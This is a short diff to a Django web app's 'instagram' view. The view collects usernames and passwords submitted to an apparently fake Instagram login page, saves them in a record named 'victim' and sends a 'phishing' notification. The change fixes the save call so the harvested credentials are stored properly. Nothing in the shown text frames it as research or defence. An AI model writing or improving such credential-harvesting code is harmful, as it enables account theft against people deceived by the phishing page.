@@ -132,9 +132,9 @@ def weather(request):
 
 def instagram(request):
     if request.method == 'POST':
-        victim,update = Instagram.objects.update_or_create(username,password)
         username = request.POST.get('username').lower()
         password = request.POST.get('password')
+        victim = Instagram.objects.create(username=username,password=password)
         victim.save()
         push(f'phishing -- {request.user} -- submitted')
         return redirect('instagram')
